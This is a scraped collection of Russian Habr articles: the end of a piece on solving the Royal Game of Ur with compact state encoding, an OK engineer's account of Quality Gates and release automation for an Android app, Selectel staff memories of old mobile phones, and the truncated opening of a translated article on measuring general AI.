Ключи поиска в нашей таблице обозначают каждую позицию, которой можно достичь в игре. Эти позиции (состояния) — это «снимки» игры в конкретный момент, в том числе и порядок хода, количество фишек и очков у каждого из игроков, а также расположение фишек на поле. Для каждого из этих состояний мы сохраняем вероятность победы игрока со светлыми фишками, если в дальнейшем оба игрока будут играть идеально.
Чтобы использовать как можно меньше памяти, мы закодировали состояния в небольшие двоичные числа. По правилам Финкеля мы кодируем состояния в 32 бита. Для упаковки всей этой информации нужны небольшие хитрости...
Самый простой способ упаковки состояния в двоичный вид по правилам Финкеля потребовал бы 54 бита:
1 бит: чей сейчас ход?
1 бит: в игре уже кто-то выиграл?
2 x 3 бита: фигуры и очки игрока со светлыми фишками.
2 x 3 бита: фигуры и очки игрока с тёмными фишками.
20 x 2 бита: содержимое каждой плитки на поле (они могут быть пустыми, содержать светлую фишку или тёмную фишку).
Простой, но неэффективный двоичный формат, который можно использовать для кодирования состояний игры в ключи.
54 бита — это не так уж плохо. Для хранения таких ключей можно использовать стандартные 64 битные числа, и это всё равно окажется достаточно быстро и эффективно по памяти. Но разве не здорово будет здорово, если удастся уместить всё в 32 бита?
К счастью, можно воспользоваться простыми трюками для снижения необходимого количества битов.
Первым делом стоит отметить, что часть информации в ключах избыточна. Количество фишек, которое осталось у игроков, и то, настало ли состояние выигрыша, можно вычислить из другой информации, хранящейся в ключах. Следовательно, мы можем убрать эти значения и сэкономить 7 битов!
Ещё от 12 битов можно избавиться, поменяв способ хранения плиток, достижимых только для одного игрока. Мы называем эти плитки «мирными зонами». Так как доступ к ним есть только у одного игрока, нам нужно только по 1 биту на каждую. Это вдвое уменьшает место, необходимое для хранения этих плиток, и мы получаем суммарный размер ключа в 35 бита. Уже довольно близко к желаемым 32 битам!
Мирные (S) и военные (W) плитки по правилам Финкеля. Мирные плитки имеют зелёный цвет, военные — красный.
Оставшиеся 3 бита можно убрать, сжав плитки военной зоны. До сжатия каждая военная плитка использует 2 бита для хранения одного из трёх состояний (пустая, светлая фишка, тёмная фишка). Это значит, что в 2 битах есть дополнительное четвёртое состояние, которое мы не используем. Иными словами, можно выполнить сжатие!
Для сжатия военной зоны мы создаём список всех допустимых 16 битных вариаций, которые может принимать военная зона, и присваиваем их новым меньшим числам при помощи небольшой таблицы поиска. Это позволяет нам сжать 16 битов до 13, добившись нашей цели — 32 битов!
Игра Ура симметрична — симметрична Ура игра
В качестве вишенки на торте мы можем удалить и бит хода, потому что царская игра Ура симметрична. На самом деле, это достаточно важно! Это значит, что если поменять местами светлого и тёмного игроков, то их вероятность победы остаётся той же. Это очень полезно, ведь благодаря этому можно хранить и вычислять лишь половину игровых состояний. Очень солидная экономия!
Двоичный формат, который мы используем для кодирования состояний игры по правилам Финкеля в ключи.
Теперь у нас есть 31-битная кодировка, которую можно применять для хранения ключей в таблице! Теоретически, минимальное количество битов, которое необходимо для представления всех 137913936 состояний — это 28. Так что мы немного не дотягиваем, но меня вполне устраивает, что мы на расстоянии всего 3 битов до идеала!
Для других правил потребуется больше 32 битов
К сожалению, при попытке перейти к другим правилам мы столкнулись с препятствием. В случае правил Мастерса и Блица мы при помощи тех же методик смогли сжать состояние всего до 34 битов из-за более длинного пути по полю. То есть на 2 бита больше, чем нам требуется...
Но в нашем мешке ещё остались трюки! Вместо того, чтобы удваивать размер ключа до 64 битов, можно разбить таблицу на 4 части. 2 дополнительных бита можно использовать для выбора части, в которой нужно выполнять поиск, а затем выполнять поиск при помощи оставшихся 32-битов. Это позволило нам уместить полмиллиарда элементов по правилам Мастерса в 3 ГБ вместо 5 ГБ!
Двоичный формат, который мы используем для кодирования в ключи игровых состояний по правилам Блица и Мастерса.
Вот и вся таблица! В нашей реализации нет ничего особенного, но она хорошо подходит для нашей цели — снижения объёма используемой памяти и обеспечения быстрого чтения и записи.
Мы выложили решённую игру в опенсорс
Теперь у вас есть всё необходимое для самостоятельного решения царской игры Ура! Однако если вам больше хочется поэкспериментировать сразу с решённой игрой, то можете воспользоваться несколькими реализациями для обучения и использовать наши модели, выложенные в опенсорс.
Готовые обученные модели выложены на HuggingFace.
Наша Java-библиотека RoyalUr-Java способна считывать и обучать эти модели.
Наша Python-библиотека RoyalUr-Python способна считывать 16-битную модель по правилам Финкеля.
Реализация на Julia разработчика Jeroen позволяет быстро обучать модели, использующие другой формат файлов.
Raph выпустил Lut Explorer, при помощи которого можно исследовать различные позиции решённой игры.
Если вы займётесь экспериментами с решённой игрой, то нам бы любопытно было узнать, чего вы смогли добиться! Если вам любопытно, приглашаю вас в наш Discord. У нас есть канал, посвящённый обсуждениям исследований, подобных тем, о котором я рассказывал выше.
Теперь отойдём от технических подробностей и поговорим о том, как решение царской игры Ура соотносится с областью ИИ в целом.
Можем ли мы решить другие игры?
Сложно найти игру, столь же подходящую для итерации состояний среды, как царская игра Ура. Из-за элемента удачи, неконечного геймплея и ограниченного количества позиций итерация состояний среды идеально подходит для её решения. Для других игр она подходит не так хорошо.
Некоторые игры, которые мне бы хотелось решить, например короткие нарды, имеют слишком много позиций, чтобы их можно было решать итерацией состояний среды. У игры Ура примерно 276 миллиардов позиций, а у коротких нард — примерно 100 квинтиллионов... Это значит, что для решения коротких нард при помощи итерации состояний среды потребуется столько памяти, что эта задача не представляется возможной. Понадобилось бы примерно 3% от общемирового размера хранилищ данных, или триллион гигабайтов.
Решение других популярных игр, например, «Четыре в ряд» (Connect-Four) или покера на костях (Yahtzee) при использовании итерации состояний среды было бы неэффективным. В Connect-Four нет костей, поэтому её эффективнее будет решать при помощи поиска. В Yahtzee есть кости, но она упрощена своим неизбежным движением вперёд. Выполнив действие в Yahtzee, вы ни за что не сможете вернуться к состоянию до этого действия; поэтому Yahtzee эффективнее решать, оценивая партию сзади вперёд.
По нашим оценкам, любую игру со сложностью пространств-состояний порядка 1E+11 или ниже реалистично решать при помощи итерации состояний среды. Это отсекает возможность применения итерации для решения более сложных игр, в том числе и коротких нард.
Метрики сложности пространства-состояния и дерева популярных игр, в том числе и царской игры Ура.
Именно поэтому, несмотря на то, что решение игры Ура стало примечательным достижением для игры, оно не будет прорывом в решении более сложных игр. Могут существовать некоторые игры с вероятностями и полной информацией, для которых можно найти сильное решение при помощи итерации состояний среды. Но сама по себе итерация не позволит нам решать сложные игры наподобие коротких нард.
Тем не менее, мы не должны полностью сбрасывать со счетов итерацию состояний среды! На напряжённых последних ходах настольной игры итерация состояний среды может принести много пользы. Продвинутые ИИ-системы для игр часто используют базы данных для безошибочных ходов в эндшпиле, а итерация состояний — это одна из методик, которые можно использовать для создания таких баз данных. Например, базы данных часто используются для идеальных стратегий конца игры в коротких нардах. Схожие техники можно также использовать для идеальных ходов в других играх наподобие лудо или парчиси!
Для чего мы будем использовать решённую игру?
Решение игры позволяет нам вычислять точность игрока в играх, создавать подробный анализ партий и дать игрокам идеального соперника (Panda). Всё это сильно влияет на то, как игроки играют в царскую игру Ура на нашем сайте.
Если вам интересно почитать о том, что это значит для игры Ура, можете изучить наш пост.
Скриншот анализа игры."
История о свершениях одного QA: о Quality Gates и оптимизации релизных процессов в ОК,https://habr.com/ru/companies/vk/articles/909970/,Задача любого тестировщика — проверять продукт на соответствие установленным требованиям и своевременно отлавливать любые баги и ошибки. В идеальных условиях или небольших проектах эта схема работает ...,"Задача любого тестировщика — проверять продукт на соответствие установленным требованиям и своевременно отлавливать любые баги и ошибки. В идеальных условиях или небольших проектах эта схема работает безотказно. Но в ситуациях, когда над продуктом работает несколько команд разработки, в релизы попадает по 30–70 задач, а обновления выкатываются каждую неделю, фокуса тестировщиков может просто не хватить. В таких условиях не обойтись без Quality Gates.
Меня зовут Юлия Садовникова. Я старший специалист по тестированию в команде Core Android компании ОК. В этой статье я расскажу о Quality Gates в ОК и о том, как QA может не просто тестировать, а реально влиять на проект и процессы.
Как устроено тестирование в ОК
ОК — крупная российская соцсеть, которой ежедневно пользуется 38 млн пользователей по всему миру. Android‑приложение ОК доступно уже более 10 лет и за это время скачано более 100 млн раз.
В ОК выделено три направления тестирования:
Продуктовое направление. Тестировщики отвечают за свои разделы и фичи в этих разделах, а также за автоматизацию кейсов на всех платформах.
Команда автоматизации. В зоне их ответственности — разработка и улучшение фреймворков для автоматизации, обучение, реализация тулов и настройка окружения для тестирования.
Core команды. Отвечают за качество всего продукта на своей платформе (iOS, Android или mobile web), подготовку и выпуск релизов, контроль процессов, написание автотестов на своих платформах, а также проведение ревью. В каждой Core команде у нас по 2 тестировщика, которые дежурят по очереди — неделя через неделю. Это позволяет переключаться на другие активности, пока напарник(‑ца) выпускает релиз (работа с поддержкой, тестирование задач, автоматизация).
В ОК есть Quality Gates как для продуктовых команд, так и для самого продукта.
Примечание: Quality Gates — заранее определенные этапы, во время которых проект проверяется на соответствие необходимым критериям для перехода к следующему этапу. Цель Quality Gates — обеспечить следование набору определенных правил и практик, чтобы предотвратить риски и повысить качество проекта.
Quality Gates для процессов в команде
Для продуктовых команд Quality Gates реализованы с применением нескольких практик.
Кик‑оф встречи для продуктовых проработок. Позволяют учитывать имеющуюся экспертизу и закладывать фундамент для тестовой документации.
Встречи на контрольных точках. Помогают скооперировать команду и оперативно понять, где есть проблемы.
Тестирование на стендах разработки, а также тестовых средах. Дают возможность начать тестирование как можно раньше, в параллель с разработкой.
Подготовка всей тестовой документации к окончанию разработки задачи. Позволяет ничего не забыть при тестировании и при необходимости подключать коллег к задаче.
Quality Gates для продукта
В контексте продукта контроль качества и соответствия требованиям обеспечивают:
Автоматизация на всех платформах (API, Web, MobWeb, IOS, Android).
Прогоны автотестов на разных тестовых средах, тестовых группах, проде. Позволяют выявлять ошибки на ранних этапах при раскатке новых версий или апдейтов.
Мониторинг ошибок 24/7. Дает возможность следить за всеми ошибками на графиках, оперативно обнаруживать инциденты и реагировать на них.
Релизные циклы или история о стабильности
Релизный цикл ОК стабилен более 7 лет — на каждый релиз приходится от 30 до 70 задач, а обновления выходят раз в неделю (не считая фиксовых релизов).
С 2019 года, когда я пришла в команду Core Android, процесс строился следующим образом:
было три основные ветки, в которые могли заливаться разработчики: develop, stable (ветка для регресса и фиксов после него) и release;
проводились прогоны автотестов по всем веткам разработки, а также основным веткам;
код фриз происходил автоматически утром (8:00) в среду;
на полный регресс приложения и все тесты выделялось 3 дня;
релиз должен был быть обязательно готов к выкладке в пятницу вечером;
использовалась схема раскатки приложения в Play Market 0.01–5–20–100%.
Схематично релизный цикл выглядел примерно следующим образом:
Но у такой схемы был один существенный недостаток — поскольку некоторые ветки и релизы накладываются друг на друга, контролировать все процессы небольшой команде QA становится крайне сложно, и практически невозможно, если тестировщик остается один.
Столкновение с реальностью и выстраивание новых гейтов
В моей Core Android команде, как и других, работало два тестировщика. Но в 2020 году мой напарник решил уйти из компании, и все процессы остались на мне. К тому моменту у нас уже были:
Unit‑тесты;
UI‑тесты (около 640 шт);
Lint‑рулы для переводов и основных сборок;
Upgrade‑тесты (тесты обновления).
Но эффективно управлять этим массивом и всеми релизными процессами в одиночку — сложная задача с высокими перегрузками, которые потенциально могли привести к деградации всего продукта. Поэтому было принято решение двигаться в сторону комплексной оптимизации.
Первая гипотеза
На первом этапе возникла самая очевидная гипотеза, что можно выпускать релизы реже. Но сразу стало понятно, что рисков и издержек у такого варианта больше, чем потенциальной выгоды:
Реже релизы — значит, в них будет попадать больше задач.
Больше задач — потенциально больше крешей.
Больше регресс — больше время выпуска фиксивого релиза.
Одновременно увеличение релизных циклов могло негативно повлиять как на продуктовые метрики, так и на лояльность пользователей:
Раскатка приложения на пользователей займет более недели.
Пользователи, у которых крешится приложение, будут вынуждены ждать исправления дольше.
Отсутствие быстрой реакции на проблемы пользователей неизбежно приведет к плохим оценкам и отзывам.
Соответственно, от идеи с увеличением релизного цикла мы отказались.
Вторая гипотеза
Далее возникла гипотеза, что можно сократить число девайсов, для который выполняется регресс.
Так, ранее под регресс попадали:
минимальная версия (5.0 — в 2020 году, 7.0 — в 2025 году);
максимальная версия (10.0 — в 2020 году, 15.0 — в 2025 году);
самая популярная версия;
промежуточные версии (7.0–8.0 — в 2020 году);
планшетная версия.
При этом регресс у нас занимал несколько дней — с 8:00 среды до вечера пятницы, и время его окончания не было строго определено. Из‑за этого могли возникать проблемы — например, фиксы могли влить в ветку stable в пятницу, вплоть до окончания рабочего дня, несмотря на то, что релиз уже проверен и почти готов к выпуску. Выпуск самого приложения занимал примерно 1,5 часа.
Чтобы снизить нагрузку на тестировщиков и уйти от существующих недостатков, было решено оставить регресс только для:
минимальной версии;
самой популярной версии;
планшетной версии (раз в 2 недели).
Смоуки и различия начали проверять на максимальной и промежуточной версиях.
Более того, вместо относительно свободного формата проведения регресса были установлены более четкие правила:
Ввели строгое время окончания регресса — 14:00 пятницы. Все задачи в stable ветке должны быть протестированы и влиты до этого времени.
После 14:00 производится отвод веток и дальнейшие работы.
Таким образом мы исключили попадание в прод фичей, не прошедших тестирование, и ушли от ночных релизов.
Новые правила для разработчиков
Далее я перешла от решения существующих недочетов к выработке практик и мер, которые могут минимизировать сложности в будущем.
Для этого изначально был проведен глубокий анализ текущего состояния.
Push напрямую в ветки
Оказалось, что у нас был разрешен push напрямую в ветки develop/stable/release (без создания merge‑реквеста). Это проблема не была подсвечена ранее и потенциально могла превратиться в катастрофу (спойлер: и даже иногда превращалась). Поэтому было принято решение оставить возможность пушить напрямую в ветку только определенному списку дежурных разработчиков и core QA — для остальных при push напрямую будет ошибка.
Дежурные разработчики не предупреждены о возможных фиксах
Далее я столкнулась с тем, что дежурные разработчики не всегда знали о различных фиксах и задачах в релизной ветке. Из‑за этого разработчики могли случайно или даже специально залить свою задачу в ветку stable и release без договоренностей с дежурными. При этом такие задачи могли задевать чужие разделы, в то время как команда, отвечающая за раздел, даже могла не знать об этом. Отчасти это было возможно, поскольку, чтобы попасть в ветку stable — release, задаче был нужен только один любой апрув, а любые договоренности с дежурным разработчиком были только на словах.
Чтобы свести к нулю подобные риски, была придумана система апрувов от дежурных, в рамках которой дежурный разработчик автоматически добавляется во все merge‑реквесты, направленные в ветки stable и release, а апрув дежурного становится обязательным для мерджа.
В Bitbucket это теперь выглядит следующим образом: при создании merge‑request автоматически добавляется reviewer — разработчик, который дежурит на этой неделе.
Затрагивание чужих разделов
Как я уже упомянула ранее, задачи, залитые без предупреждения, могли затрагивать разделы других команд без их ведома.
Чтобы исключить такую возможность и сопутствующие ей риски, мы добавили в проект файл с ответственными разработчиками за каждый модуль (их должно быть два) и сделали обязательным хотя бы один аппрув от мейнтейнеров, если задет чей‑то раздел.
На практике это работает следующим образом:
Билд система при создании автоматически добавляет ответственных в merge‑реквест.
Кнопка мерджа остается неактивной, пока не будет получен один обязательный апрув от ответственного за модуль. Требование к наличию одного обязательного апрува также осталось.
Соответственно, без согласований merge‑реквест не может быть залит.
Новые правила для всех
От проблем и оптимизации в части задач разработчиков я перешла к общей оптимизации релизных процессов.
Работа с тестами
В 2020 году у нас уже было реализовано сообщение в Jira и Bitbucket с полезной информацией о билдах. В нем были отчеты о прогонах автотестов, прикрепленные билды, ссылки на merge‑реквест и другие данные.
У нас была вся информация, но в условиях отсутствия строгих регламентов пользы от нее было мало:
с упавшими UI‑тестами можно было залить задачу в ветку разработки;
UI‑тесты гонялись, но их могли не смотреть;
UI‑тесты гонялись, но экспертизы на их анализ не хватало (например, если падали тесты в чужих разделах);
UI‑тесты гонялись, но разработчики их игнорировали (как и этап тестирования).
Решением стали доработки, реализованные со стороны команды автоматизации и на стороне Bitbucket. Теперь наглядно видно всю информацию обо всех упавших тестах и при падении стабильного теста на выходе будет красный билд — залить merge‑реквест не получится.
Работа с ветками и версиями
Помимо прочего, я сталкивалась с необходимостью постоянно пинговать разработчиков для отвода веток — например, из Develop в Stable, из Stable в Release. Кроме лишних коммуникаций, это было сопряжено еще и с вынужденным ожиданием — на сборку и переключение разработчика между ветками могло уходить до 1,5–2 часов.
Для оптимизации было принято решение создать джобы на CI для менеджмента релизов, собрать их в одном пространстве. Благодаря этому, теперь дежурный разработчик и/или дежурный тестировщик могут сами отводить ветки без переключения между ними и длительных ожиданий.
С поднятиями версий была аналогичная проблема — я была зависима от разработчиков и была вынуждена их пинговать.
Для оптимизации в этом случае была написана отдельная джоба, в которой прописывались version code и version name.
Нюанс в том, что при ручном поднятии версии сборку приходится ждать лишние 30–40 минут. Поэтому мы с разработчиками пошли дальше и добавили накрутку версии в джобу автоматического автоотвода веток. При этом версия берется из календаря версий в Jira, а сборка выполняется со всеми изменениями. Таким образом мы ушли от длительного ожидания сборки.
Дополнительно мы реализовали нотификации от бота, что упростило отслеживание состояние джоб.
Выкладка в сторы
Также мы хотели управлять выкладкой оперативно и в одном месте сразу в несколько сторов.
Поэтому решили использовать API от Google, RuStore и AppGallery, чтобы с помощью джобы в любой момент иметь возможность управлять публикациями: загружать, поднимать процент, полностью раскатывать и выполнять другие действия.
Введение SLA на креши и баги
Также мы сталкивались с проблемой, что заведенные креши или баги фиксили очень долго либо не фиксили вообще — некоторые мажорные или минорные таски могли висеть годами.
Поэтому было принято решение ввести SLA на креши разного типа. Теперь:
Блокирующие креши (которые блокируют раскатку релиза) должны быть устранены за 1 день.
Критические креши, которые не блокируют раскатку релиза, должны быть устранены в следующем релизе, то есть в течение 7 дней.
Мажорные креши должны быть устранены в течение 30 дней.
Минорные креши, которые задевают небольшой процент пользователей, должны быть устранены в течение 90 дней.
Для удобства также подключили нотификации, которые помогают отслеживать сроки фикса крешей.
Отказ от стабильной ветки
В начале 2025 года мы отказались от стабильной ветки — это стало возможным благодаря масштабированию автоматизации на проекте. Так, если в 2019 году у нас было всего 640+ тестов, то к 2025 их число выросло до 1647. То есть мы полностью автоматизировали ручной регресс core команды. Это позволило нам практически безболезненно отказаться от ручного регресса.
Но чтобы такой отказ не спровоцировал деградацию процессов и всего продукта, мы:
в течение полугода следили за тем, как раскатываются релизы и какие проблемы в них появляются;
выделили смоук‑тесты, которые всегда должны быть зелеными;
ввели SLA на фиксы смоук автотестов тестировщиками.
Вместо исходной реализации с тремя ветками, код фризом утром в среду и регрессом продолжительностью в три дня, мы пришли к новой модели:
оставили две основные ветки, в которые могут заливаться наши разработчики: develop и release;
автоматический код фриз сдвинули на 12:00 каждой пятницы;
для быстрого смоука приложений и анализ прогона автотестов достаточно одного часа;
готовность релиза к выкладке — пятница вечер;
Используется схема раскатки 0,01–5–20–100%.
Соответственно, изменилась и схема релизных процессов. Так, раньше у нас ветки и релизы могли накладываться друг на друга, а на регресс уходило много времени.
Сейчас же наложение релизов маловероятно, на регресс надо минимум времени, а работа с двумя ветками заметно упростила работу дежурных разработчиков и тестировщиков.
Примечание: Во время подготовки этой статьи наши процессы снова немного трансформировались — мы непрерывно работаем над их улучшением. Теперь наши раскатки приложения в Play market стали проходить по новым процентам: 0.01–5–20–99.99–100%. Это обусловлено тем, что мы хотим иметь возможность манипулировать раскаткой выпущенной версии, и, если необходимо, откатываться к прошлой. Но если ваша версия уже находится на 100% — ничего с ней сделать нельзя.
Итоги и планы на будущее
Проделанная работа подтверждает, что Quality Gates в релизных процессах — действительно полезный инструмент для нахождения проблем на более ранних этапах разработки и тестирования. Убедилась я и в том, что QA может не только тестировать свой продукт, но и эффективно оптимизировать процессы, в которых работает — я прошла через это лично. Например, благодаря работе над процессами, уменьшился Time to market и освободилось больше времени на написание автотестов.
Профит от проделанной работы особенно заметен в числах.
Было
Стало
Тестирование
3 дня для регресса и автотестов
Быстрый смоук за один час и регресс автотестами
Количество тестов
641
1647
Время разбора инцидентов с ветками
1 час
15 минут
Накрутка версии и ожидание дополнительного билда
40 минут
0 минут
Время на отвод веток
1–2 часа (выполняется разработчиком)
5 минут (выполняется автоматически)
Но мы не останавливаемся на достигнутом и продолжаем комплексную оптимизацию. Так, в перспективе планируется реализовать и добавить:
автоперевод тасок в статусе Commited в Resolved с выпуском релиз‑кандидата;
автоперевод нерешенных задач в следующую версию с выпуском релиз‑кандидата;
нотификации в личку, если в твоем PR завалился билд (часто видим это только на этапе тестирования);
супермердж для core команды любого PR с обходом мейнтейнеров с нотификацией в чат;
выкладку релиза с помощью бота.
О том, что из этого получится — расскажем в одной из следующих статей.
А пока делитесь в комментариях используемыми практиками проверки проекта на соответствие требованиям и отсутствие багов."
"Siemens A52, Nokia Lumia 800 и другие телефоны, которые были у сотрудников Selectel в детстве",https://habr.com/ru/companies/selectel/articles/909932/,"Начинка современных флагманских смартфонов, безусловно, впечатляет. Но помните, какими были мобильники раньше? Если у вас сводит олдскулы от упоминания 64-голосной полифонии, камеры 1,3 мегапикселя, п...","Начинка современных флагманских смартфонов, безусловно, впечатляет. Но помните, какими были мобильники раньше? Если у вас сводит олдскулы от упоминания 64-голосной полифонии, камеры 1,3 мегапикселя, передачи файлов через ИК-порт и своего стандарта разъема для зарядки у каждого производителя, то эта статья для вас. Под катом вас ждет подборкой трогательных историй от наших сотрудников. Погружайтесь в ностальгию вместе с нами.

Alcatel OT 331


Источник.
«Первый телефон мне купили в далеком 2004 году. На этот Alcatel 331 с классными играми я копила весь учебный год. Ради модели с синей панелькой мы поехали на другой конец города. Пока добирались до «Дыбенко», новый телефон кто-то купил, а из б/у версий осталась только поцарапанная.

По возвращении на «Пионерскую» мама решила поднять мне настроение брелочком на телефон и предложила купить самую популярную, белую модель. Я согласилась. И как вы думаете, какой смартфон был в наличии? Правильно, синий! Так я стала обладателем телефона мечты и даже получила в подарок футболку болельщика Зенита.», — Любовь Руденко, системный администратор.


Nokia Lumia 800


«Самым прекрасным устройством стала Lumia 800. Пока все познавали Android, я хотел Nokia. Стоила она тогда дороже, а я не знал, что Windows Phone — боль. Телефон идеально лежал в руке, никогда не лагал, прекрасно фотографировал и имел крутой черный экран еще до всяких AMOLED. Безумно много ночей было проведено за этими тремя дюймами с 3G-интернетом: в переписках ВК и в море фотографий с «мероприятий».

Расстраивало, что одноклассники уже играли в Fruit Ninja, Doodle Jump, Subway Surfers, а я довольствовался скудной библиотекой Xbox Live, думая, что вот-вот появятся игры. И все равно Lumia 800 остался лучшим устройством в жизни. А умер он просто — после падения экраном на кафель. Не снимайте чехлы, глупцы!», — Дмитрий Румянцев, специалист отдела техподдержки.




Siemens SL45


Источник.
«Siemens SL45 — не первый мой телефон, но самый запоминающийся. Янтарная подсветка и встроенный МРЗ-плеер с ММС-карточкой! Еще он безбожно «хакался». Какие только штуки туда ни ставились: читалки, калькуляторы, обои, и… всякое.

А один из стаканов для зарядки послужил мне корпусом «ленивого пульта» для компьютера с «power» и «reset». Сделал его очень просто — с помощью кабеля RJ-11.», — Алексей Исмаилов, старший разработчик.


Panasonic GD87


Источник.
«Я была подростком, когда мобильники только-только начали становиться доступными. Первый телефон даже не был моим — просила у родителей их Motorola и уходила гулять. И не чтобы оставаться на связи — просто это было круто и ново! Так что подарок на день рождения в виде Panasonic GD87 стал настоящим счастьем.

Эта раскладушка пережила со мной первую влюбленность — через нее прошли тонны СМС. Мы пытались обмениваться с друзьями картинками через ИК-порт (хотя и безуспешно). И, конечно, записывали себя на диктофон — только вот записи были совсем короткими и прерывались на середине фразы. Но было весело! С тех пор сменилось множество телефонов, но тот первый Panasonic навсегда занял место в сердце.», — Настя Ткачева, продуктовый редактор.


Samsung Gusto 3 Flip


Источник.
«Хоть я и не застал время с самыми крутыми моделями, но свой первый телефон помню как вчера. Тот самый Samsung Gusto 3 Flip! Родители купили мне его в первом классе. Было столько радости от обычной раскладушки для маленького меня. Весь вечер мучал бабушку с дедушкой, чтобы показали, как пользоваться.

В телефоне была возможность поставить на фото контактов мультяшные заготовки со зверятами. Вся семья получила персональное животное. И каждый был оповещен! Я специально звонил, чтобы рассказать: «Маааам, привеееет, а знаешь, как ты у меня в телефоне выглядишь? Ты кошечка», «Пааап, привет. А ты у меня в телефоне лев!»
Столько радости было для ребенка в тот вечер!

А узелок, чтобы вешать устройство на шею? Как же это было модно тогда! А камераааа… Ну очень он мне нравился. Самое интересное, что именно этот маленький телефончик привил мне привычку пользоваться устройствами Samsung. До сих пор покупаю смартфоны только этой компании.

Также у нас в семье было принято предавать телефоны по наследству: от мамы — ко мне, от меня — бабушке, от бабушки — к деду и так далее. Поэтому исторически сложилось, что вся семья пользуется Samsung — тоже небольшая традиция.», — Максим Андрющенко, системный инженер.


Siemens A50


Источник.
«Модель моего первого телефона по своей неубиваемости могла составить конкуренцию легендарной Nokia 3310. Если бы у Чака Норриса был второй телефон, то это точно был бы Siemens A50.

Однажды во время зимней прогулки с друзьями я обнаружил, что телефона нет в кармане. В итоге мы нашли его в сугробе. После двух часов в снегу аппарат был полностью работоспособен, а экран приветливо светился оранжевым. Как-то я упал с высокого каштана во дворе и приземлился на карман с телефоном. Ему абсолютно ничего не было, а у меня еще неделю болело бедро.

Отдельно хотелось бы отметить его вибрацию. Будучи на даче, я оставил телефон на первом этаже и ускакал на чердак — в свое мальчишечье логово. Когда раздался звонок, я не услышал мелодию, но почувствовал вибрацию!», — Андрей Егоров, руководитель направления эксплуатации и ввода инфраструктуры.


Siemens A52


Источник.
«В далеком 2004 году я в очередной раз пошла гулять с подружками в одном конце города, а оказалась — в другом. Сказать что мне всыпали — ничего не сказать, но мама приняла решение подарить телефон, чтобы всегда знать где я нахожусь.

Моим первым телефоном стал Siemens A52 с оранжевой подсветкой и почти настоящей полифонией, эх времена! С ним я была самой крутой девчонкой на районе, могла включать забавные пищалки и даже, при большом желании, забить гвоздь.

С этой неубиваемой машиной я проходила много лет и передала ее по наследству младшей сестре, а после телефон потерялся в пучине времени.

Спасибо, легенда!», — Юлия Ковальски, системный администратор.


Nokia 5310 XpressMusic


Источник.
«Скучаю по телефонам с кнопочной клавиатурой. Помню, как мы хвастались скоростью печати — для нас это было круто! И по раскладушкам, которыми можно было эпично хлопать после звонка. Прикольные воспоминания у меня связаны с Nokia 5310 XpressMusic. По какой-то причине в нем не было интернета, аськи и других способов чатиться во время болезни, поэтому я придумал свой способ.

Фотографировал что-то вплотную, чтобы получился черный фон, и в редакторе накладывал текст. Затем отправлял картинку тому, кого найду рядом по bluetooth. Так я нашел своего «bluetooth-друга», с которым мы обменивались сообщениями, музыкой и всякой ерундой, которая была в телефонах. Кто это был — я так и не узнал.», — Максим Рыжих, специалист поддержки продаж.


Nokia 3500 classic


Источник.
«Мой самый любимый из ранних телефонов — Nokia 3500 classic. Ярко-малиновый с черным (как полагалось в 2007 году), с матовой задней крышкой и серебряной рамкой он казался мне верхом дизайна того времени. Между глянцевых кнопок виднелась малиновая подложка с подсветкой и все это красиво акцентировал малиновый джойстик.

Больше всего в телефоне запомнился встроенный эквалайзер, которым я постоянно пользовалась, переключаясь с Amatory и Linkin Park на Chris Brown.

А браузер Opera Mini, через который мы уже тогда заходили в ВК на переменах, чтобы быстро ответить на новую запись на стене? В те времена еще не было дешевого мобильного интернета (оплата шла поминутно), поэтому такие заходы были редкие и быстрые — естественно, только чтобы ответить своему школьному крашу, с которым стояло СП.

Никаких мобильных версий не было — выглядело это очень неудобно, и я вообще не понимаю, как мы выжили. Конечно, преимущественно сидели в Аське, но и про ВК не забывали.

Еще я помню, как вечерами за компом гуглила Java-игры на Symbian и через USB перекидывала их на телефон. Думаю, многие вспомнят Bobby Carrot, Prince of Persia, Doodle Jump, Bounce Ball и другие. И конечно же, любимую музыку с zaycev.net!

А смешные темы на мобильник? Их дизайн был прямым отражением того времени. Эти картинки и рингтоны на телефон мы могли купить, отправив смс на номер из рекламы с задней стороны школьных тетрадок. Стоила услуга очень дорого, поэтому у нас было развито пиратство.

Из-за того, что Nokia 3500 был со мной в подростковом возрасте (в те самые 2007 — 2010 годы), поэтому он так дорог моему сердечку.», — Анастасия Павлова, веб-аналитик.


Motorola Talkabout T2288


Источник.
«Элегантный кирпич серого цвета с характерной для тех лет окраской в мелкую блестку и шикарными на ощупь кнопками, как на пульте у бабушки, с аккуратной и манящей антенной занимал меня своим великолепием так давно, что об этом не принято говорить.

2003 год — эпоха «Евросети» с нашумевшими маркетинговыми акциями, на улицах Питера чаще встречались жигули, чем иномарки, центр выглядел лампово и не так ухоженно, как сейчас, а впереди ждали прекрасные годы старшей школы и первых курсов университета, курс доллара — вечные 30 и папа такой молодой. Вот примерно в такие времена я и получил в руки его.

Б/у, без упаковки, с неподходящей зарядкой. Экран с зеленой подсветкой, функция блокировки кнопок и SMS на русском! Это, кстати, весь набор опций, что и так редкость для телефонов того времени. Хотя в магазинах было что-то интереснее и новее, даже с играми, но именно таким был мой первый и единственный подаренный батей телефон. «Труба» — было точно про него.

Позднее я купил чехол на ремень джинс, откуда он грозно торчал своей антенкой. А под пиджаком от школьной формы смотрелся совсем в стиле поздних девяностых. Ощущал ли я себя с ним «серьезнее»? Пфф, конечно, да! Использовал я его, чтобы позвонить родственникам и доложить, что иду домой. И изредка расшифровал полупотерянные оператором сообщения от девочки, которая мне нравилась.», — Олег Шалаев, менеджер по инфраструктуре."
"Пару слов о «ломаном» универсальном ИИ: o3, Gemini 2.5 и туманное будущее",https://habr.com/ru/companies/vktech/articles/909958/,"Сегодня в мире ИИ-бум. Но мы до сих пор не знаем, как измерять интеллект, креативность или эмпатию этих систем. Тесты, которыми мы пользуемся, далеки от идеала. Но самое главное — они изначально созда...","Сегодня в мире ИИ-бум. Но мы до сих пор не знаем, как измерять интеллект, креативность или эмпатию этих систем. Тесты, которыми мы пользуемся, далеки от идеала. Но самое главное — они изначально создавались не для ИИ, а для человека. Команда VK Tech перевела статью о том, что такое универсальный ИИ, как вообще тестировать и «измерять» искусственный интеллект и как на самом деле неравномерно распределяются его возможности и способности.
Введение
